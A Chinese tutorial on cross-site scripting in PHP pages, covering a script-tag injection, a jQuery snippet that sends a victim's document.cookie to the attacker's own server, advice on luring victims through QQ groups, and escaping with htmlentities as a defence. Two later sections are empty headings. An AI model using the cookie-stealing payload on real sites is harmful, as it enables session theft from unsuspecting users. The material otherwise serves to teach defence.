
## 概念

XSS是最常见的一种web攻击方式，它指的是恶意用户把代码注入到其他用户要访问的网站中。

站在前端的角度，可以理解为将js代码注入。

```php
<?php
    $username="鹏仔";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo $username;?>
        </div>
    </body>
</html>
```

如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下：

```php
<?php
    $username="<script>alert('侯医生');</script>";
?>
```

如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：

```javascript
$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
```

再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了。

## 防范

最简单的解决方法，就是在前端将输出数据进行转义。

比如，上述的XSS攻击的本质，就是因为浏览器遇到了`<script>`标签，然后才会执行其中的脚本。

因此，我们只需要对`<script>`标签进行转义，则浏览器就不会执行其中的恶意脚本。

```php
<?php
    $username="<script>alert('鹏仔');</script>";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码-->
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
    </body>
</html>
```

> 在 Node.js 中，可以用 htmlEncode() 。

## 升级版XSS



## 升级版防范策略












